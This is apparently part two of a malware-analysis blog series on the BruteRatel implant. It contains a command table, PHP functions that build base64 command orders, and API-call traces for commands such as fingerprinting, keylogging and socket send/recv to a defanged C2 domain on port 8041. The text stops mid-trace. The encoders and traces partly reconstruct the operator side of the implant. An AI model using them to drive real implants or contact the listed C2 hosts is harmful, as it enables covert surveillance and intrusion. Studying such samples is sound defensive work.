---
title: "BruteRatel full command analysis (2/X)"
date: 2025-03-19 
---

<link rel="stylesheet" href="/css/main.css">

## BRUTERATEL  

## Context  

BruteRatel SHA256 : d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1  

Sample Source :  
[bazaar.abuse.ch](https://bazaar.abuse.ch/sample/d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1/)   

VirusTotal :  
[VirusTotal](https://www.virustotal.com/gui/file/d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1)  

Network / C2 :  
http://tiguanin[.]com/bazar.php:8041  
http://tiguanin[.]com/admin.php:8041  
http://bazarunet[.]com/admin.php:8041  
http://bazarunet[.]com/bazar.php:8041  
http://greshunka[.]com/bazar.php:8041  
http://greshunka[.]com/admin.php:8041  

# INTRO  

This article is the second part of my full analysis of BruteRatel commands :  
[First Part](https://cedricg-mirror.github.io/2025/03/17/BruteRatel.html)  
[Third Part](https://cedricg-mirror.github.io/2025/03/17/BruteRatel3.html)  

This detailed analysis will be split into several parts, I will be presenting in this post the next 20 commands that BruteRatel can respond to.  

# COMMAND LIST

Here is a short description of the next 20 command codes and purpose :  

| Command ID   | Description             | Parameter         |
| :----------- | :---------------------- | :----------------:|
| "\x48\x52"   | [Fingerprint](#Fingerprint) | NA                |
| "\x35\x61"   | [EnumWindows](#EnumWindows) | NA                |
| "\xe8\x73"   | [GetInstalledProgramsList](#GetInstalledProgramsList) | NA                |
| "\xa3\xd9"   | [RegisterSessionPowerSettingNotification](#RegisterSessionPowerSettingNotification) | NA                |
| "\x59\xd3"   | [recv](#recv) | $label $hostname $port |
| "\x59\xd4"   | [sendto](#sendto) | $label $hostname $port $b64_data |
| "\x60\xd4"   | [send](#send) | $socket, $b64_data |
| "\x59\xd9"   | [closesocket](#closesocket) | $socket          |
| "\xa1\x2d"   | [start_keylogging](#start_keylogging) | NA                |
| "\x29\x21"   | [update_sleep_conf](#update_sleep_conf) | $int1, $int2       |
| "\x39\x11"   | [SetCurrentDirectory](#SetCurrentDirectory) | $dir_path             |
| "\x05\xa9"   | [CopyFileW](#CopyFileW) | $src, $dst          |
| "\x05\xa9"   | [MoveFileW](#MoveFileW) | $src, $dst    |
| "\x93\xe9"   | [DeleteFileSecure](#DeleteFileSecure) | $dos_path, $secure_erase        |
| "\x61\x3f"   | [CreateDirectoryW](#CreateDirectoryW) | $dir_path         |
| "\x40\x8f"   | [RemoveDirectoryW](#RemoveDirectoryW) | $dir_path |
| "\x32\x0a"   | [listdir](#listdir) | $dir_path        | 
| "\x59\xa9"   | [NetInfo](#NetInfo) | $option, $unknown | 
| "\x84\xf5"   | [CreateProcessWithLogon](#CreateProcessWithLogon) | $domain $username $password $AppName $CommandLine | 
| "\x99\xf9"   | [LogonUserW](#LogonUserW) | $type, $domain, $username, $password |

# Dynamic Analysis  

In the following section, I share some dynamic analysis results from the aforementioned commands :  

<a id="Fingerprint"></a>
# Fingerprint  

```php
function fingerprint()
{
	$cmd_id = "\x48\x52";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [3077]
[PTP] [0xb78] [0x554] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000546E657BE0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+R83cErJ4Hw/Yqg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000546E6676F0
[PAR] DWORD   *pcbBinary : 0x000000547065EAEC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x54705bbea1]
```

**II. Execution**   

```html
[CNT] [369]
[PTP] [0x728] [0xb70] [c:\windows\system32\rundll32.exe]
[API] <GlobalMemoryStatusEx> in [KERNEL32.DLL] 
[PAR] LPMEMORYSTATUSEX lpBuffer : 0x000000653952E608
[RET] [0x65394a14c0]

[CNT] [380]
[PTP] [0x728] [0xb70] [c:\windows\system32\rundll32.exe]
[API] <GetDiskFreeSpaceExA> in [KERNEL32.DLL] 
[PAR] LPCSTR          lpDirectoryName              : 0x0 (null)
[PAR] PULARGE_INTEGER lpFreeBytesAvailableToCaller : 0x0
[PAR] PULARGE_INTEGER lpTotalNumberOfBytes         : 0x000000653952E5C8
[PAR] PULARGE_INTEGER lpTotalNumberOfFreeBytes     : 0x000000653952E5D0
[RET] [0x65394a1563]

[CNT] [389]
[PTP] [0x728] [0xb70] [c:\windows\system32\rundll32.exe]
[API] <GetNativeSystemInfo> in [KERNEL32.DLL] 
[PAR] LPSYSTEM_INFO lpSystemInfo : 0x000000653952E5D8
[RET] [0x65394a1621]

[CNT] [434]
[PTP] [0x728] [0xb70] [c:\windows\system32\rundll32.exe]
[API] <RtlGetVersion> in [ntdll.dll] 
[PAR] PRTL_OSVERIONINFOW lpVersionInformation : 0x000000653952E5F8
[RET] [0x65394a17f6]
```

**III. Result**   

```html
[CNT] [3160]
[PTP] [0xb78] [0x554] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000546E670E00
[STR]        -> "4852"
[STR]           "955/4095 45637 61087 9 3 65536 2 9 4096 8664 00007FFFFFFEFFFF 0000000000010000 6 14857 6.3.9600"
[PAR] DWORD  cbBinary   : 0xc8
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000000546E64F0F0
[PAR] DWORD* pcchString : 0x000000547065E7DC
[RET] [0x54705be028]
```

<a id="EnumWindows"></a>
# EnumWindows

```php
function EnumWindows()
{
	$cmd_id = "\x35\x61";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [361]
[PTP] [0x808] [0x98c] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000366F0F8F70
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+WtzQErJ4Hw/Yqg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000366F10AFC0
[PAR] DWORD   *pcbBinary : 0x000000367105EC8C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x3670fbbea1]
```

**II. Execution**   

```html
[CNT] [802]
[PTP] [0x484] [0xb20] [c:\windows\system32\rundll32.exe]
[API] <EnumDesktopWindows> in [USER32.dll] 
[PAR] HDESK       hDesktop : 0x0
[PAR] WNDENUMPROC lpfn     : 0x0000007EFF511E40
[PAR] LPARAM      lParam   : 0x0000007EFF5CE578
[RET] [0x7eff5427d0]

[CNT] [809]
[PTP] [0x484] [0xb20] [c:\windows\system32\rundll32.exe]
[API] <GetWindowTextW> in [USER32.dll] 
[PAR] HWND   hWnd      : 0x40054
[PAR] LPWSTR lpString  : 0x0000007EFF5CE268
[PAR] int    nMaxCount : 0x9ca6ec20
[RET] [0x7eff511e8a]

[CNT] [810]
[PTP] [0x484] [0xb20] [c:\windows\system32\rundll32.exe]
[API] <IsWindowVisible> in [USER32.dll] 
[RET] [0x7eff511e9f]

[ * ] [pid 0x484][tid 0xb20] c:\windows\system32\rundll32.exe
[API] <_vsnwprintf>
[PAR] wchar_t  *buffer : 0x0000007EFE9DA430
[STR]          -> "Changement de tâche"
[RES] int 19

[CNT] [825]
[PTP] [0x484] [0xb20] [c:\windows\system32\rundll32.exe]
[API] <GetWindowTextW> in [USER32.dll] 
[PAR] HWND   hWnd      : 0x101a0
[PAR] LPWSTR lpString  : 0x0000007EFF5CE268
[PAR] int    nMaxCount : 0x9ca6ec20
[RET] [0x7eff511e8a]

[CNT] [826]
[PTP] [0x484] [0xb20] [c:\windows\system32\rundll32.exe]
[API] <IsWindowVisible> in [USER32.dll] 
[RET] [0x7eff511e9f]

[ * ] [pid 0x484][tid 0xb20] c:\windows\system32\rundll32.exe
[API] <_vsnwprintf>
[PAR] wchar_t  *buffer : 0x0000007EFE9C6080
[STR]          -> "VBoxSharedClipboardClass"
[RES] int 24

[...]
```

**III. Result**   

No proper result so far, malware is always freezing before ending the command execution  

<a id="GetInstalledProgramsList"></a>
# GetInstalledProgramsList

```php
function GetInstalledProgramsList()
{
	$cmd_id = "\xe8\x73";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0xf54] [0xf64] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x00000020D6C06880
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+IsPYErJ4Hw/Yqg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x00000020D6C17650
[PAR] DWORD   *pcbBinary : 0x00000020D8B6E8BC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x20d8acbea1]
```

**II. Execution**   

```html
[CNT] [335]
[PTP] [0xf54] [0xf64] [c:\windows\system32\rundll32.exe]
[API] <RegOpenKeyExW> in [ADVAPI32.dll] 
[PAR] HKEY    hKey      : 0x80000002 (HKEY_LOCAL_MACHINE)
[PAR] LPCWSTR lpSubKey  : 0x00000020D6BFBE90
[STR]         -> "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
[PAR] DWORD   ulOptions : 0x0
[RET] [0x20d8ac9c99]

[CNT] [342]
[PTP] [0xf54] [0xf64] [c:\windows\system32\rundll32.exe]
[API] <RegEnumKeyExW> in [ADVAPI32.dll] 
[PAR] HKEY      hKey              : 0x304 
[PAR] DWORD     dwIndex           : 0x0
[PAR] LPWSTR    lpName            : 0x00000020D8B6D7D0
[PAR] LPDWORD   lpcchName         : 0x00000020D8B6D79C
[FLD]           -> cchName = 0x800
[PAR] LPDWORD   lpReserved        : 0x0
[PAR] LPWSTR    lpClass           : 0x0
[PAR] LPDWORD   lpcchClass        : 0x0
[PAR] PFILETIME lpftLastWriteTime : 0x0
[RET] [0x20d8ac9d1d]

[CNT] [343]
[PTP] [0xf54] [0xf64] [c:\windows\system32\rundll32.exe]
[API] <RegOpenKeyExW> in [ADVAPI32.dll] 
[PAR] HKEY    hKey      : 0x80000002 (HKEY_LOCAL_MACHINE)
[PAR] LPCWSTR lpSubKey  : 0x00000020D6C07AD0
[STR]         -> "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\AddressBook"
[PAR] DWORD   ulOptions : 0x0
[RET] [0x20d8ac9d73]

[CNT] [344]
[PTP] [0xf54] [0xf64] [c:\windows\system32\rundll32.exe]
[API] <RegQueryValueExW> in [ADVAPI32.dll] 
[PAR] HKEY    hKey        : 0x308 
[PAR] LPCWSTR lpValueName : 0x00000020D6C0C910
[STR]         -> "DisplayName"
[RET] [0x20d8ac9dc5]

[CNT] [345]
[PTP] [0xf54] [0xf64] [c:\windows\system32\rundll32.exe]
[API] <RegCloseKey> in [ADVAPI32.dll] 
[PAR] HKEY hKey : 0x308
[RET] [0x20d8ac9dfc]

[...]
```

**III. Result**   

```html
[CNT] [465]
[PTP] [0xf54] [0xf64] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x00000020D6BFF190
[STR]        -> "E873"
[STR]           "Mozilla Firefox ESR (x64 fr)"
[STR]           "Mozilla Maintenance Service"
[STR]           "Oracle VirtualBox Guest Additions 7.1.6"
[STR]           "Oracle VM VirtualBox Guest Additions 5.2.38"
[STR]           "Microsoft Visual C++ 2022 X64 Additional Runtime - 14.36.32532"
[STR]           "Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.36.32532"
[PAR] DWORD  cbBinary   : 0x21a
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x00000020D6C1A7B0
[PAR] DWORD* pcchString : 0x00000020D8B6D68C
[RET] [0x20d8ace028]
```

<a id="RegisterSessionPowerSettingNotification"></a>
# RegisterSessionPowerSettingNotification

Didn't look into how those callback were being used  

```php
function RegisterSessionPowerSettingNotification()
{
	$cmd_id = "\xa3\xd9";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0x6bc] [0xacc] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000211A957AA0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+e7L+ErJ4Hw/Yqg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000211A96C2E0
[PAR] DWORD   *pcbBinary : 0x000000211C90EC7C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x211c86bea1]
```

**II. Execution**   

```html
[CNT] [371]
[PTP] [0x6bc] [0xac4] [c:\windows\system32\rundll32.exe]
[API] <RegisterClassExW> in [USER32.dll] 
[PAR] WNDCLASSEX *lpwcx : 0x000000211CE8F410
            ->  lpfnWndProc   : 0x000000211C8564E0
            ->  hInstance     : 0x0000000000000000
            ->  lpszMenuName  : 0x0 (null)
            ->  lpszClassName : 0x000000211C888BA0 ("a")
[RET] [0x211c86b5b5]

[CNT] [373]
[PTP] [0x6bc] [0xac4] [c:\windows\system32\rundll32.exe]
[API] <CreateWindowExW> in [USER32.dll] 
[PAR] DWORD     dwExStyle    : 0x0
[PAR] LPCWSTR   lpClassName  : 0x000000211C888BA0
[STR]           -> "a"
[PAR] LPCWSTR   lpWindowName : 0x000000211C888AAC
[STR]           -> ""
[PAR] DWORD     dwStyle      : 0x0
[PAR] HWND      hWndParent   : 0x0
[PAR] HMENU     hMenu        : 0x0
[PAR] HINSTANCE hInstance    : 0x000000211C740000
[PAR] LPVOID    lpParam      : 0x0
[RET] [0x211c86b637]

[CNT] [374]
[PTP] [0x6bc] [0xac4] [c:\windows\system32\rundll32.exe]
[API] <WTSRegisterSessionNotification> in [wtsapi32.dll] 
[PAR] HWND  hWnd    : 0x5015c
[PAR] DWORD dwFlags : 0x1 (NOTIFY_FOR_ALL_SESSIONS)
[RET] [0x211c86b64d]

[CNT] [375]
[PTP] [0x6bc] [0xac4] [c:\windows\system32\rundll32.exe]
[API] <RegisterPowerSettingNotification> in [USER32.dll] 
[PAR] HANDLE  hRecipient       : 0x5015c
[PAR] LPCGUID PowerSettingGuid : 0x000000211C887BB0
[PAR] DWORD   Flags            : 0x0 (DEVICE_NOTIFY_WINDOW_HANDLE)
[RET] [0x211c86b679]
```

**III. Result**   

```html
[CNT] [380]
[PTP] [0x6bc] [0xac4] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000211A95EFA0
[STR]        -> "A3D9"
[STR]           "11"
[PAR] DWORD  cbBinary   : 0xe
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000000211A957320
[PAR] DWORD* pcchString : 0x000000211CE8F2AC
[RET] [0x211c86e028]
```

<a id="recv"></a>
# recv

Connects to a remonte IP/port and awaits incoming data  

```php
function recv($label, $hostname, $port)
{
	$cmd_id = "\x59\xd3 $label $hostname $port";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

I used the following parameters : toto tiguanin.com 8041  
It's also possible to specify an IP insted of a host name.  

```html
[CNT] [434]
[PTP] [0xa74] [0x900] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000004EF0914840
[STR]         -> " WdMgdG90byB0aWd1YW5pbi5jb20gODA0MQ=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000004EF092A070
[PAR] DWORD   *pcbBinary : 0x0000004EF297ECDC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x4ef28dbea1]
```

**II. Execution**   

```html
[CNT] [452]
[PTP] [0xa74] [0xa4c] [c:\windows\system32\rundll32.exe]
[API] <inet_pton> in [ws2_32.dll] 
[PAR] INT   Family        : 0x2 (AF_INET) (IPv4)
[PAR] PCSTR pszAddrString : 0x0000004EF09205D0
[STR]       -> "tiguanin.com"
[PAR] PVOID pAddrBuf      : 0x0000004EF2EED39C
[RET] [0x4ef28efced]

[CNT] [453]
[PTP] [0xa74] [0xa4c] [c:\windows\system32\rundll32.exe]
[API] <gethostbyname> in [ws2_32.dll] 
[PAR] PCHAR name : 0x0000004EF09205D0
[STR]       -> "tiguanin.com"
[RET] [0x4ef28efd00]

[CNT] [456]
[PTP] [0xa74] [0xa4c] [c:\windows\system32\rundll32.exe]
[API] <inet_ntoa> in [ws2_32.dll] 
[PAR] struct in_addr in : 0x2e8ffea9
            -> 169.254.143.46
[RET] [0x4ef28efd4c]

[CNT] [457]
[PTP] [0xa74] [0xa4c] [c:\windows\system32\rundll32.exe]
[API] <socket> in [ws2_32.dll] 
[PAR] int address_family : 0x2 (AF_INET) (IPv4)
[PAR] int type           : 0x1 (SOCK_STREAM)
[PAR] int protocol       : 0x6 (IPPROTO_TCP)
[RET] [0x4ef28efebb]

[CNT] [458]
[PTP] [0xa74] [0xa4c] [c:\windows\system32\rundll32.exe]
[API] <inet_addr> in [ws2_32.dll] 
[PAR] PCHAR      cp : 0x0000004EF0920310
[STR]            -> "169.254.143.46"
[RET] [0x4ef28efed3]

[CNT] [459]
[PTP] [0xa74] [0xa4c] [c:\windows\system32\rundll32.exe]
[API] <htons> in [ws2_32.dll] 
[PAR] u_short hostshort  : 8041 (0x1f69)
[RET] [0x4ef28efee4]

[CNT] [460]
[PTP] [0xa74] [0xa4c] [c:\windows\system32\rundll32.exe]
[API] <connect> in [ws2_32.dll] 
[PAR] SOCKET          s       : 0x2f8
[PAR] struct sockaddr *name   : 0x0000004EF2EED3DC
[FLD]          -> sin_family   : 2 (IPv4)
[FLD]          -> sin_port     : 26911 (Little endian : 8041)
[FLD]          -> sin_addr     : 169.254.143.46
[PAR] int             namelen : 0x10
[RET] [0x4ef28eff03]

[CNT] [487]
[PTP] [0xa74] [0xa4c] [c:\windows\system32\rundll32.exe]
[API] <recv> in [ws2_32.dll] 
[PAR] SOCKET s      : 0x2f8
[PAR] char   *buf   : 0x0000004EF2EED3EF
[PAR] int    len    : 0x2000
[RET] [0x4ef28f001f]
```

**III. Result**   

```html
[CNT] [485]
[PTP] [0xa74] [0xa4c] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000004EF0928480
[STR]        -> "59D3"
[STR]           "AA toto 169.254.143.46 8041 2F8"
[PAR] DWORD  cbBinary   : 0x48
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x0
[PAR] DWORD* pcchString : 0x0000004EF2EED2CC
[RET] [0x4ef28ddff1]
```

<a id="sendto"></a>
# sendto

```php
function sendto($label, $hostname, $port, $b64_data)
{
	$cmd_id = "\x59\xd4 $label $hostname $port $b64_data";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [366]
[PTP] [0x874] [0x11c] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000009ABBCD5380
[STR]         -> " WdQgdG90byAxNjkuMjU0LjE0My40NiA4MDQxIFJHOGdlVzkxSUhSb2FXNXJJSFJvWVhRbmN5QmhhWElnZVc5MUozSmxJR0p5WldGMGFHbHVaeUJ1YjNjZ1B"
[STR]            "3PT0="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000009ABBCBC1A0
[PAR] DWORD   *pcbBinary : 0x0000009ABDCBE70C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x9abdc1bea1]
```

**II. Execution**   

```html
[CNT] [386]
[PTP] [0x874] [0x610] [c:\windows\system32\rundll32.exe]
[API] <inet_pton> in [ws2_32.dll] 
[PAR] INT   Family        : 0x2 (AF_INET) (IPv4)
[PAR] PCSTR pszAddrString : 0x0000009ABBCBBCD0
[STR]       -> "169.254.143.46"
[PAR] PVOID pAddrBuf      : 0x0000009ABE21ED98
[RET] [0x9abdc30371]

[CNT] [387]
[PTP] [0x874] [0x610] [c:\windows\system32\rundll32.exe]
[API] <socket> in [ws2_32.dll] 
[PAR] int address_family : 0x2 (AF_INET) (IPv4)
[PAR] int type           : 0x2 (SOCK_DGRAM)
[PAR] int protocol       : 0x11 (IPPROTO_UDP)
[RET] [0x9abdc304ce]

[CNT] [388]
[PTP] [0x874] [0x610] [c:\windows\system32\rundll32.exe]
[API] <inet_addr> in [ws2_32.dll] 
[PAR] PCHAR      cp : 0x0000009ABBCBBCD0
[STR]            -> "169.254.143.46"
[RET] [0x9abdc304ee]

[CNT] [389]
[PTP] [0x874] [0x610] [c:\windows\system32\rundll32.exe]
[API] <htons> in [ws2_32.dll] 
[PAR] u_short hostshort  : 8041 (0x1f69)
[RET] [0x9abdc304ff]

[CNT] [391]
[PTP] [0x874] [0x610] [c:\windows\system32\rundll32.exe]
[API] <sendto> in [ws2_32.dll] 
[PAR] SOCKET          s    : 0x2fc
[PAR] char            *buf : 0x0000009ABBCC6E60
[STR]                 -> "Do you think that's air you're breathing now ?"
[PAR] int             len  : 0x2e
[PAR] struct sockaddr *to  : 0x0000009ABE21EDE0
[FLD]          -> sin_family   : 2 (IPv4)
[FLD]          -> sin_port     : 26911 (Little endian : 8041)
[FLD]          -> sin_addr     : 169.254.143.46
[RET] [0x9abdc3052d]

[CNT] [393]
[PTP] [0x874] [0x610] [c:\windows\system32\rundll32.exe]
[API] <recvfrom> in [ws2_32.dll] 
[PAR] SOCKET s      : 0x2fc
[PAR] char   *buf   : 0x0000009ABE21EDF1
[PAR] int    len    : 0xffff
[RET] [0x9abdc30593]
```

**III. Result**   

```html
[ * ] [pid 0x874][tid 0x11c] c:\windows\system32\rundll32.exe
[API] <_vsnprintf>
[PAR] char_t   *buffer : 0x0000009ABBCDACF0
[STR]          -> "QQA2AEQANAAKADAAIAAxADUANQAyAA=="
[RES] int 32
```

<a id="send"></a>
# send

Requires an already opened socket  

```php
function send($socket, $b64_data)
{
	$cmd_id = "\x60\xd4 $socket $b64_data";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [429]
[PTP] [0x808] [0x6ac] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000EA4F6AD0B0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+TcXESM8xHCvp7T6lJFtMt34bWhY+jKTME5ToKiAcCaC6FAT8uJY3cbOjUNqSHZ/6L9cc0ai/dO4YGPGqJ4vHR4c7K4oMbCmc"
[STR]            "3DtN6FJArXO8WHsfIBF65nojU8GSo+1IoIU="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000EA4F689590
[PAR] DWORD   *pcbBinary : 0x000000EA516DEA6C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xea5163bea1]
```

**II. Execution**   

```html
[CNT] [439]
[PTP] [0x808] [0x6ac] [c:\windows\system32\rundll32.exe]
[API] <send> in [ws2_32.dll] 
[PAR] SOCKET s    : 0xb
[PAR] char   *buf : 0x000000EA4F69AD20
[STR]        -> "Do you think that's air you're breathing now ?"
[PAR] int    len  : 0x2e
[RET] [0xea5164fac4]

[CNT] [440]
[PTP] [0x808] [0x6ac] [c:\windows\system32\rundll32.exe]
[API] <closesocket> in [ws2_32.dll] 
[PAR] SOCKET       s : 0xb
[RET] [0xea5164fafb]
```

**III. Result**   

TODO  

<a id="closesocket"></a>
# closesocket

Closes an already opened socket  

```php
function closesocket($socket)
{
	$cmd_id = "\x59\xd9 $socket";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0x734] [0x41c] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000E1BFF16800
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+Q+/+SM8/Y0WXtxe8HTA="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000E1BFF29760
[PAR] DWORD   *pcbBinary : 0x000000E1C1E5E82C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xe1c1dbbea1]
```

**II. Execution**   

```html
[CNT] [335]
[PTP] [0x734] [0x41c] [c:\windows\system32\rundll32.exe]
[API] <closesocket> in [ws2_32.dll] 
[PAR] SOCKET       s : 0xb
[RET] [0xe1c1dcfb9b]
```

**III. Result**   

```html
Nothing
```

<a id="start_keylogging"></a>
# start_keylogging

```php
function start_keylogging()
{
	$cmd_id = "\xa1\x2d";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [275]
[PTP] [0x50c] [0xa64] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x00000040569163B0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+e9ilEg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000405690B390
[PAR] DWORD   *pcbBinary : 0x00000040588CE8FC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x405882bea1]
```

**II. Execution**   

```html
[CNT] [335]
[PTP] [0x50c] [0x86c] [c:\windows\system32\rundll32.exe]
[API] <GetKeyState> in [USER32.dll] 
[RET] [0x4058831914]

[CNT] [336]
[PTP] [0x50c] [0x86c] [c:\windows\system32\rundll32.exe]
[API] <GetKeyState> in [USER32.dll] 
[RET] [0x4058831921]

[CNT] [338]
[PTP] [0x50c] [0x86c] [c:\windows\system32\rundll32.exe]
[API] <_vsnwprintf> in [ntdll.dll] 
[PAR] wchar_t  *buffer : 0x00000040568EC090
[PAR] size_t   size    : 0x2
[PAR] wchar_t  *format : 0x0000004058848456
[PAR] va_list  argptr  : 0x0000004058E3F1D0
[RET] [0x4058843d41]

[ * ] [pid 0x50c][tid 0x86c] c:\windows\system32\rundll32.exe
[API] <_vsnwprintf>
[PAR] wchar_t  *buffer : 0x00000040568EC090
[STR]          -> "AE"
[RES] int 2

[CNT] [340]
[PTP] [0x50c] [0x86c] [c:\windows\system32\rundll32.exe]
[API] <_vsnwprintf> in [ntdll.dll] 
[PAR] wchar_t  *buffer : 0x00000040568EC090
[PAR] size_t   size    : 0x1
[PAR] wchar_t  *format : 0x0000004058848440
[PAR] va_list  argptr  : 0x0000004058E3F1D0
[RET] [0x4058843d41]

[ * ] [pid 0x50c][tid 0x86c] c:\windows\system32\rundll32.exe
[API] <_vsnwprintf>
[PAR] wchar_t  *buffer : 0x00000040568EC090
[STR]          -> " "
[RES] int 1

[CNT] [342]
[PTP] [0x50c] [0x86c] [c:\windows\system32\rundll32.exe]
[API] <_vsnwprintf> in [ntdll.dll] 
[PAR] wchar_t  *buffer : 0x00000040568EC090
[PAR] size_t   size    : 0x2
[PAR] wchar_t  *format : 0x000000405884844A
[PAR] va_list  argptr  : 0x0000004058E3F1D0
[RET] [0x4058843d41]

[ * ] [pid 0x50c][tid 0x86c] c:\windows\system32\rundll32.exe
[API] <_vsnwprintf>
[PAR] wchar_t  *buffer : 0x00000040568EC090
[STR]          -> "65"
[RES] int 2

[...]
```

**III. Result**   

```html
TODO
```

<a id="update_sleep_conf"></a>
# update_sleep_conf

I didn't look to much into it, but it's definitly related to ZwWaitForSingleObjectEx and will update the in-memory configuration of the malware  
Maybe something related to the beaconing frequency ?  

```php
function update_sleep_conf($int1, $int2)
{
	$cmd_id = "\x29\x21 $int1 $int2";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0x9f0] [0x3bc] [c:\windows\system32\rundll32.exe]
